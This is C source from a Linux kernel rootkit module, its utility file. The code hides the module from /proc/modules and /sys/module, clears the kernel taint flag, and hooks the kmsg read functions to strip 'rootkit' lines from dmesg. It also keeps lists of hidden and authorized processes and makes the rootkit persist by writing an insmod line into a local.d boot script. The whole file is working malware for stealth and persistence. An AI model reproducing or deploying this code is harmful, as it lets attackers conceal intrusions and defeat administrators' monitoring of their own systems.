#include "utils.h"

#include "constants.h"
#include "hooking.h"
#include "macro_utils.h"
#include <asm-generic/bitops/instrumented-atomic.h>
#include <asm/current.h>
#include <linux/cred.h>
#include <linux/errno.h>
#include <linux/fs.h>
#include <linux/kobject.h>
#include <linux/list.h>
#include <linux/mm.h>
#include <linux/module.h>
#include <linux/panic.h>
#include <linux/pid.h>
#include <linux/printk.h>
#include <linux/proc_fs.h>
#include <linux/rbtree.h>
#include <linux/rcupdate.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/sysfs.h>
#include <linux/types.h>
#include <linux/vmalloc.h>

LIST_HEAD(hidden_pids_list);
LIST_HEAD(authorized_pids_list);

const string_t S_HIDDEN_PREFIXES[] = STRING_ARRAY(HIDDEN_PREFIXES);

static bool b_hidden = false; // Is the rootkit hidden?

static struct list_head *p_prev_module = NULL; // Pointer to the previous module in the list

static task_t *(*_find_get_task_by_vpid)(pid_t nr) = NULL; // Pointer to `find_get_task_by_vpid()`

static struct list_head *p_vma_list = NULL; // Pointer to `vmap_area_list`
static struct rb_root *p_vma_root   = NULL; // Pointer to `vmap_area_root`

static unsigned long *p_tainted_mask = NULL;

static struct proc_ops *p_kmsg_proc_ops    = NULL; // Pointer to `kmsg_proc_ops`
static struct file_operations *p_kmsg_fops = NULL; // Pointer to `kmsg_fops`

static proc_read_t p_orig_kmsg_read    = NULL; // Pointer to the original `kmsg_read()` function
static proc_read_t p_orig_devkmsg_read = NULL; // Pointer to the original `devkmsg_read()` function

#define COPY_CHUNK_SIZE (16 * PAGE_SIZE)

// Taken from kernel/module.c:3103
int copy_chunked_from_user(void *p_dst, const void __user *p_usrc, unsigned long ui64_len)
{
    do {
        unsigned long n = min(ui64_len, COPY_CHUNK_SIZE);

        if (copy_from_user(p_dst, p_usrc, n) != 0)
            return -EFAULT;
        cond_resched();
        p_dst += n;
        p_usrc += n;
        ui64_len -= n;
    } while (ui64_len);
    return 0;
}

static ssize_t do_kmsg_read_hooked(const proc_read_t orig_read, file_t *p_file, char __user *s_buf,
                                   size_t sz_count, loff_t *p_ppos)
{
    ssize_t sz_ret = 0; // Return value

    pr_dev_info("`%ps()` hooked\n", orig_read);

    // Call the original function and filter the output
    sz_ret = orig_read(p_file, s_buf, sz_count, p_ppos);

    if (sz_ret > 0) {
        // Hide lines that contain "rootkit"
        sz_ret = hide_lines(s_buf, sz_ret, "rootkit");
    }

    pr_dev_info("* `%ps()` returned %zd\n", orig_read, sz_ret);
    return sz_ret;
}

static ssize_t kmsg_read_hooked(file_t *file, char __user *buf, size_t count, loff_t *ppos)
{
    return do_kmsg_read_hooked(p_orig_kmsg_read, file, buf, count, ppos);
}

static ssize_t devkmsg_read_hooked(file_t *file, char __user *buf, size_t count, loff_t *ppos)
{
    return do_kmsg_read_hooked(p_orig_devkmsg_read, file, buf, count, ppos);
}

bool is_filename_hidden(const char *const s_filename)
{
    size_t i;

    // Check if the name starts with a hidden prefix
    for (i = 0; S_HIDDEN_PREFIXES[i].s_str != NULL; ++i) {
        if (strncmp(s_filename, S_HIDDEN_PREFIXES[i].s_str, S_HIDDEN_PREFIXES[i].sz_len) == 0) {
            return true;
        }
    }

    return false;
}

void hide_module(void)
{
    unsigned int i           = 0;
    bool b_previously_hidden = false; // Was the module already hidden once?
    struct vmap_area *p_vma;
    struct vmap_area *p_vma_tmp;
    struct module_use *p_use;
    struct module_use *p_use_tmp;
    struct module_notes_attrs *notes_attrs = NULL;
    struct module_sect_attrs *sect_attrs   = NULL;

    pr_dev_info("Hiding module...\n");

    IF_U (b_hidden) {
        pr_dev_warn("* Rootkit is already hidden\n");
        return;
    }

    if (p_prev_module != NULL) {
        // p_prev_module can only be not NULL if the module was already hidden once
        b_previously_hidden = true;
    }

    // Remove module from /proc/modules, saving a pointer to the previous module
    p_prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);

    IF_U (b_previously_hidden) {
        pr_dev_info("* Module was already hidden once, do not hide anything else\n");
        goto end;
    }

    IF_L (p_tainted_mask == NULL) {
        p_tainted_mask = (unsigned long *)lookup_name("tainted_mask");

        IF_U (p_tainted_mask == NULL) {
            pr_dev_err("* Failed to get `tainted_mask` address\n");
        }
        else {
            pr_dev_info("* Original tainted_mask: *%p = %lu\n", p_tainted_mask, *p_tainted_mask);

            clear_bit(TAINT_OOT_MODULE, p_tainted_mask);

            pr_dev_info("  * Cleared TAINT_OOT_MODULE status\n");
            pr_dev_info("  * Edited tainted_mask: *%p = %lu\n", p_tainted_mask, *p_tainted_mask);
        }
    }

    // Clear dependency list (see kernel/module.c)
    list_for_each_entry_safe (p_use, p_use_tmp, &THIS_MODULE->target_list, target_list) {
        pr_dev_info("* Removing dependency source %p, target %p...", p_use->source->name,
                    p_use->target->name);
        list_del(&p_use->source_list);
        list_del(&p_use->target_list);
        sysfs_remove_link(p_use->target->holders_dir, THIS_MODULE->name);
        kfree(p_use);
        pr_dev_cont(" done\n");
    }

    // Clear notes_attr (see kernel/module.c)
    notes_attrs = THIS_MODULE->notes_attrs;
    IF_L (notes_attrs != NULL) {
        pr_dev_info("* Removing notes_attr %p...", notes_attrs);
        if (notes_attrs->dir != NULL) {
            i = THIS_MODULE->notes_attrs->notes;
            while (i-- > 0) {
                pr_dev_info("  * Removing attr %u (%p)...", i, &notes_attrs->attrs[i]);
                sysfs_remove_bin_file(notes_attrs->dir, &notes_attrs->attrs[i]);
            }
            kobject_put(notes_attrs->dir);
        }
        kfree(notes_attrs);
        THIS_MODULE->notes_attrs = NULL;
    }

    // Clear sect_attrs (see kernel/module.c)
    sect_attrs = THIS_MODULE->sect_attrs;
    IF_L (sect_attrs != NULL) {
        pr_dev_info("* Removing sect_attr %p...", sect_attrs);
        sysfs_remove_group(&THIS_MODULE->mkobj.kobj, &sect_attrs->grp);
        for (i = 0; i < sect_attrs->nsections; i++) {
            pr_dev_info("  * Freeing attr %u (%p)...", i, &sect_attrs->attrs[i]);
            kfree(sect_attrs->attrs[i].battr.attr.name);
        }
        kfree(sect_attrs);
        THIS_MODULE->sect_attrs = NULL;
    }

    // Clear various fields
    THIS_MODULE->modinfo_attrs->attr.name = NULL;
    kfree(THIS_MODULE->mkobj.mp);
    THIS_MODULE->mkobj.mp = NULL;
    kfree(THIS_MODULE->mkobj.drivers_dir);
    THIS_MODULE->mkobj.drivers_dir = NULL;

    // Remove module from /sys/module/
    kobject_del(&THIS_MODULE->mkobj.kobj);
    list_del(&THIS_MODULE->mkobj.kobj.entry);

    // Hide dmesg entries
    pr_dev_info("* Hiding dmesg entries...\n");

    IF_L (p_kmsg_proc_ops == NULL) {
        p_kmsg_proc_ops = (struct proc_ops *)lookup_name("kmsg_proc_ops");
    }
    IF_U (p_kmsg_proc_ops == NULL) {
        pr_dev_err("  * Failed to get `kmsg_proc_ops` address\n");
    }
    else {
        pr_dev_info("  * kmsg_proc_ops: %p\n", p_kmsg_proc_ops);

        IF_L (p_orig_kmsg_read == NULL) {
            p_orig_kmsg_read = p_kmsg_proc_ops->proc_read;
            pr_dev_info("  * kmsg_read: %p\n", p_orig_kmsg_read);
            change_protected_value(&p_kmsg_proc_ops->proc_read, kmsg_read_hooked);
        }
    }

    IF_L (p_kmsg_fops == NULL) {
        p_kmsg_fops = (struct file_operations *)lookup_name("kmsg_fops");
    }
    IF_U (p_kmsg_fops == NULL) {
        pr_dev_err("  * Failed to get `kmsg_fops` address\n");
    }
    else {
        pr_dev_info("  * kmsg_fops: %p\n", p_kmsg_fops);

        IF_L (p_orig_devkmsg_read == NULL) {
            p_orig_devkmsg_read = p_kmsg_fops->read;
            pr_dev_info("  * devkmsg_read: %p\n", p_orig_devkmsg_read);
            change_protected_value(&p_kmsg_fops->read, devkmsg_read_hooked);
        }
    }

    // Cannot hide module from /proc/vmallocinfo as it crashes when the module is removed
    // TODO: save the module's vmap_areas, and restore them before removing the module
    goto end; // For now, just skip this part

    IF_L (p_vma_list == NULL) {
        p_vma_list = (struct list_head *)lookup_name("vmap_area_list");
        pr_dev_info("* p_vma_list: %p\n", p_vma_list);
    }

    IF_L (p_vma_root == NULL) {
        p_vma_root = (struct rb_root *)lookup_name("vmap_area_root");
        pr_dev_info("* p_vma_root: %p\n", p_vma_root);
    }

    IF_U (p_vma_list == NULL || p_vma_root == NULL) {
        pr_dev_err("* Failed to get `vmap_area_list` or `vmap_area_root` address\n");
    }
    else {
        // Remove module from /proc/vmallocinfo
        list_for_each_entry_safe (p_vma, p_vma_tmp, p_vma_list, list) {
            if ((unsigned long)THIS_MODULE > p_vma->va_start &&
                (unsigned long)THIS_MODULE < p_vma->va_end) {
                pr_dev_info("* Removing VMAP area %p...", p_vma);
                list_del(&p_vma->list);
                rb_erase(&p_vma->rb_node, p_vma_root);
                pr_dev_cont(" done\n");
            }
        }
    }

end:
    b_hidden = true;

    pr_dev_info("* Module was hidden\n");
}

void unhide_module(void)
{
    pr_dev_info("Unhiding module...\n");

    IF_U (!b_hidden) {
        pr_dev_warn("* Rootkit is not hidden\n");
        return;
    }

    // Unhide module from /proc/modules
    list_add(&THIS_MODULE->list, p_prev_module);

    b_hidden = false;

    pr_dev_info("* Module was unhidden\n");
}

static task_t *get_task_struct_by_pid(const pid_t i32_pid)
{
    task_t *p_task = NULL; // Task structure

    IF_U (_find_get_task_by_vpid == NULL) {
        _find_get_task_by_vpid = (task_t * (*)(pid_t)) lookup_name("find_get_task_by_vpid");

        pr_dev_info("  * `find_get_task_by_vpid()` address: %p\n", _find_get_task_by_vpid);

        IF_U (_find_get_task_by_vpid == NULL) {
            pr_dev_err("  * Failed to get `find_get_task_by_vpid()` address\n");
            return NULL;
        }
    }

    p_task = _find_get_task_by_vpid(i32_pid);

    return p_task;
}

static bool is_pid_in_list(pid_t *const p_pid, task_t **const pp_task,
                           const struct list_head *const p_pid_list)
{
    bool b_ret                    = false; // Return value
    const pid_list_t *p_pid_entry = NULL;  // PID list entry
    task_t *p_task                = NULL;  // Task structure, either from args or from PID
    pid_t i32_pid                 = -1;    // PID to check, either from args or from task

    if (p_pid != NULL) {
        i32_pid = *p_pid;
    }
    if (pp_task != NULL) {
        p_task = *pp_task;
    }

    IF_U (i32_pid == -1 && p_task == NULL) {
        pr_dev_warn("  * is_pid_in_list: No PID or task given\n");
        return false;
    }

    if (i32_pid == -1) {
        i32_pid = p_task->pid;

        if (p_pid != NULL) {
            *p_pid = i32_pid;
        }
    }
    else if (p_task == NULL) {
        if (i32_pid == 0 || i32_pid == current->pid) {
            p_task = get_task_struct(current);
        }
        else {
            p_task = get_task_struct_by_pid(i32_pid);
        }

        IF_U (p_task == NULL) {
            pr_dev_err("  * Failed to get task struct\n");
            *pp_task = NULL;
            return false;
        }

        if (pp_task != NULL) {
            *pp_task = p_task;
        }
    }

    BUG_ON(p_task->pid != i32_pid);
    //pr_dev_info("  * Checking PID %d, task PID %d\n", i32_pid, p_task->pid);

    pr_dev_info("  * Task comm: %s", p_task->comm);
    IF_U (is_filename_hidden(p_task->comm)) {
        pr_dev_cont(" -> has hidden prefix\n");
        b_ret = true;
        goto put_return;
    }
    else {
        pr_dev_cont(" -> no hidden prefix\n");
    }

    // Check if the given PID is in the list
    list_for_each_entry (p_pid_entry, p_pid_list, list) {
        pr_dev_info("  * Checking PID %d against given PID %d...", p_pid_entry->i32_pid, i32_pid);

        IF_U (p_pid_entry->i32_pid == i32_pid) {
            pr_dev_cont(" yes!\n");
            b_ret = true;
            goto put_return;
        }
        else {
            pr_dev_cont(" no\n");
        }
    }

put_return:
    if (pp_task == NULL) {
        // Put the task struct as it won't be used anymore
        put_task_struct(p_task);
    }
    return b_ret;
}

static bool is_pid_or_parent_in_list(const pid_t i32_pid, const struct list_head *const p_pid_list)
{
    bool b_ret            = false;                      // Return value
    pid_t i32_real_pid    = get_effective_pid(i32_pid); // Effective PID to check
    task_t *p_task        = NULL;                       // Task with the given PID
    task_t *p_task_parent = NULL;                       // Parent task
    task_t *p_task_tmp    = NULL;                       // Temp pointer to keep a reference

    if (i32_real_pid == -1) {
        return false;
    }

    pr_dev_info("* Checking if PID %d is in the list...\n", i32_real_pid);

    // Check the given PID, and get its task struct
    b_ret = is_pid_in_list(&i32_real_pid, &p_task, p_pid_list);

    IF_U (b_ret) {
        pr_dev_info("  * PID %d matches!\n", i32_real_pid);
        goto loop_end;
    }

    IF_U (p_task == NULL) {
        return false;
    }

    // Check if one of the given process' parents is in the list
    p_task_parent = p_task;
    while (true) {
        p_task_parent = get_task_struct(p_task_parent);

        rcu_read_lock();
        p_task_tmp = rcu_dereference(p_task_parent->real_parent);
        rcu_read_unlock();
        put_task_struct(p_task_parent);
        p_task_parent = p_task_tmp;

        if (p_task_parent == NULL || p_task_parent->pid == 0) {
            b_ret = false;
            break;
        }

        pr_dev_info("  * Checking parent PID %d...", p_task_parent->pid);

        b_ret = is_pid_in_list(NULL, &p_task_parent, p_pid_list);

        IF_U (b_ret) {
            pr_dev_info("  * PID %d matches (thanks to parent %d)!\n", i32_real_pid,
                        p_task_parent->pid);
            goto loop_end;
        }
    }

loop_end:
    put_task_struct(p_task);
    return b_ret;
}

bool is_pid_hidden(const pid_t i32_pid)
{
    pr_dev_info("* Checking if PID %d is hidden...\n", i32_pid);

    return is_pid_or_parent_in_list(i32_pid, &hidden_pids_list);
}

void show_all_processes(void)
{
    pid_list_t *p_hidden_pid = NULL; // Hidden PID list entry
    pid_list_t *p_tmp        = NULL; // Temporary pointer for iteration

    pr_dev_info("Unhiding all processes...\n");

    // Remove all PIDs from the hidden list
    list_for_each_entry_safe (p_hidden_pid, p_tmp, &hidden_pids_list, list) {
        pr_dev_info("* Unhiding PID %d\n", p_hidden_pid->i32_pid);
        list_del(&p_hidden_pid->list);
        kfree(p_hidden_pid);
    }
}

bool is_process_authorized(const pid_t i32_pid)
{
    pr_dev_info("* Checking if PID %d is authorized...\n", i32_pid);

    return is_pid_or_parent_in_list(i32_pid, &authorized_pids_list);
}

void clear_auth_list(void)
{
    pid_list_t *p_authorized_pid = NULL; // Authorized PID list entry
    pid_list_t *p_tmp            = NULL; // Temporary pointer for iteration

    pr_dev_info("Clearing authorized process list...\n");

    // Remove all PIDs from the authorized list
    list_for_each_entry_safe (p_authorized_pid, p_tmp, &authorized_pids_list, list) {
        pr_dev_info("* Removing PID %d from authorized list\n", p_authorized_pid->i32_pid);
        list_del(&p_authorized_pid->list);
        kfree(p_authorized_pid);
    }
}

void restore_kmsg_read(void)
{
    pr_dev_info("Restoring `kmsg_read()`...\n");

    IF_U (p_kmsg_proc_ops == NULL) {
        pr_dev_err("* `p_kmsg_proc_ops` is NULL\n");
        goto devkmsg;
    }

    IF_U (p_orig_kmsg_read == NULL) {
        pr_dev_err("* `p_orig_kmsg_read` is NULL\n");
        goto devkmsg;
    }

    change_protected_value(&p_kmsg_proc_ops->proc_read, p_orig_kmsg_read);

    pr_dev_info("* `kmsg_read()` restored\n");

devkmsg:
    pr_dev_info("Restoring `devkmsg_read()`...\n");

    IF_U (p_kmsg_fops == NULL) {
        pr_dev_err("* `p_kmsg_fops` is NULL\n");
        return;
    }

    IF_U (p_orig_devkmsg_read == NULL) {
        pr_dev_err("* `p_orig_devkmsg_read` is NULL\n");
        return;
    }

    change_protected_value(&p_kmsg_fops->read, p_orig_devkmsg_read);

    pr_dev_info("* `devkmsg_read()` restored\n");
}

size_t hide_lines(char __user *const s_buffer, const size_t sz_len, const char *const s_search)
{
    size_t sz_ret    = sz_len; // Return buffer size
    char *s_buffer_k = NULL;   // Kernel buffer

    pr_dev_info("Checking lines to hide...\n");

    s_buffer_k = kvmalloc(sz_len, GFP_KERNEL);
    IF_U (s_buffer_k == NULL) {
        pr_dev_err("* Failed to allocate kernel buffer\n");
        goto ret;
    }

    IF_U (copy_from_user(s_buffer_k, s_buffer, sz_len) != 0) {
        pr_dev_err("* Failed to copy buffer from user\n");
        goto free_ret;
    }

    pr_dev_info("* Buffer: %s\n", s_buffer_k);

    IF_U (strnstr(s_buffer_k, s_search, sz_len) != NULL) {
        pr_dev_info("  * Hiding line\n");
        // Clear user buffer and return size 1 (since 0 would mean EOF)
        IF_U (clear_user(s_buffer + 1, sz_len - 1) != 0) {
            pr_dev_err("* Failed to clear user buffer\n");
        }
        sz_ret = 1;
    }
    else {
        pr_dev_info("  * Keeping line\n");
    }

free_ret:
    kvfree(s_buffer_k);
ret:
    return sz_ret;
}

int kernel_copy_file(file_t *const p_src_file, file_t *const p_dst_file)
{
    int i32_err        = 0;    // Error code
    char *s_buf        = NULL; // Temp kernel buffer
    ssize_t sz_read    = 0;    // Number of bytes read
    ssize_t sz_write   = 0;    // Number of bytes written
    loff_t i64_src_pos = 0;    // Source file position
    loff_t i64_dst_pos = 0;    // Destination file position

    pr_dev_info("Copying file...\n");

    s_buf = kmalloc(PAGE_SIZE, GFP_KERNEL);
    IF_U (s_buf == NULL) {
        pr_dev_err("* Failed to allocate kernel buffer\n");
        i32_err = -ENOMEM;
        goto ret;
    }

    while ((sz_read = kernel_read(p_src_file, s_buf, PAGE_SIZE, &i64_src_pos)) > 0) {
        pr_dev_info("* Read %zd bytes from file\n", sz_read);
        pr_dev_info("  * Offset: %lld\n", i64_src_pos);
        sz_write = kernel_write(p_dst_file, s_buf, sz_read, &i64_dst_pos);
        IF_U (sz_write < 0) {
            pr_dev_err("* Failed to write to file\n");
            i32_err = sz_read;
            goto free_ret;
        }
        pr_dev_info("* Wrote %zd bytes to file\n", sz_write);
        pr_dev_info("  * Offset: %lld\n", i64_dst_pos);
    }

    IF_U (sz_read < 0) {
        pr_dev_err("* Failed to read from file\n");
        i32_err = sz_read;
        goto free_ret;
    }

free_ret:
    kfree(s_buf);
ret:
    return i32_err;
}

int copy_module_file(void)
{
    int i32_err        = 0;    // Error code
    char *s_src_name   = NULL; // Source file name
    char *s_dst_name   = NULL; // Destination file name
    file_t *p_src_file = NULL; // Source file pointer
    file_t *p_dst_file = NULL; // Destination file pointer

    pr_dev_info("Copying module file...\n");

    if (strnstr(THIS_MODULE->name, "_mod", strlen(THIS_MODULE->name)) != NULL) {
        pr_dev_info("* Module file already copied\n");
        goto ret;
    }

    s_src_name = kzalloc(PATH_MAX, GFP_KERNEL);
    IF_U (s_src_name == NULL) {
        pr_dev_err("* Failed to allocate kernel buffer\n");
        i32_err = -ENOMEM;
        goto ret;
    }

    s_dst_name = kzalloc(PATH_MAX, GFP_KERNEL);
    IF_U (s_dst_name == NULL) {
        pr_dev_err("* Failed to allocate kernel buffer\n");
        i32_err = -ENOMEM;
        goto free_src;
    }

    snprintf(s_src_name, PATH_MAX, MOD_FILE, THIS_MODULE->name);
    snprintf(s_dst_name, PATH_MAX, MOD_COPY, THIS_MODULE->name);
    pr_dev_info("* Source file: %s\n", s_src_name);
    pr_dev_info("* Dest   file: %s\n", s_dst_name);

    p_src_file = filp_open(s_src_name, O_RDONLY, 0);
    IF_U (IS_ERR_OR_NULL(p_src_file)) {
        pr_dev_err("* Failed to open source file\n");
        i32_err = PTR_ERR(p_src_file);
        goto free_dst;
    }

    p_dst_file = filp_open(s_dst_name, O_CREAT | O_WRONLY | O_TRUNC, 0600);
    IF_U (IS_ERR_OR_NULL(p_dst_file)) {
        pr_dev_err("* Failed to open destination file\n");
        i32_err = PTR_ERR(p_dst_file);
        goto close_src;
    }

    i32_err = kernel_copy_file(p_src_file, p_dst_file);
    IF_U (i32_err != 0) {
        pr_dev_err("* Failed to copy file\n");
        goto close_dst;
    }

    pr_dev_info("* Copied file\n");

close_dst:
    IF_L (!IS_ERR_OR_NULL(p_dst_file)) {
        filp_close(p_dst_file, NULL);
    }
close_src:
    IF_L (!IS_ERR_OR_NULL(p_src_file)) {
        filp_close(p_src_file, NULL);
    }
free_dst:
    kfree(s_dst_name);
free_src:
    kfree(s_src_name);
ret:
    return i32_err;
}

int create_locald_file(void)
{
    int i32_err      = 0;    // Error code
    file_t *p_file   = NULL; // File pointer
    char *s_contents = NULL; // Kernel buffer for file contents

    pr_dev_info("Creating file %s...\n", LOCALD_FILE);

    p_file = filp_open(LOCALD_FILE, O_CREAT | O_WRONLY | O_TRUNC, 0700);
    IF_U (IS_ERR_OR_NULL(p_file)) {
        pr_dev_err("* Failed to open file\n");
        i32_err = PTR_ERR(p_file);
        goto ret;
    }

    s_contents = kzalloc(LOCALD_SIZE, GFP_KERNEL);
    IF_U (s_contents == NULL) {
        pr_dev_err("* Failed to allocate kernel buffer\n");
        i32_err = -ENOMEM;
        goto close;
    }

    snprintf(s_contents, LOCALD_SIZE, "insmod " MOD_COPY "\n", THIS_MODULE->name);
    pr_dev_info("* File contents: %s\n", s_contents);

    i32_err = kernel_write(p_file, s_contents, strlen(s_contents), NULL);
    IF_U (i32_err < 0) {
        pr_dev_err("* Failed to write to file\n");
        goto free_close;
    }

    pr_dev_info("* Wrote %d bytes to file\n", i32_err);
    i32_err = 0;

free_close:
    kfree(s_contents);
close:
    IF_L (!IS_ERR_OR_NULL(p_file)) {
        filp_close(p_file, NULL);
    }
ret:
    return i32_err;
}
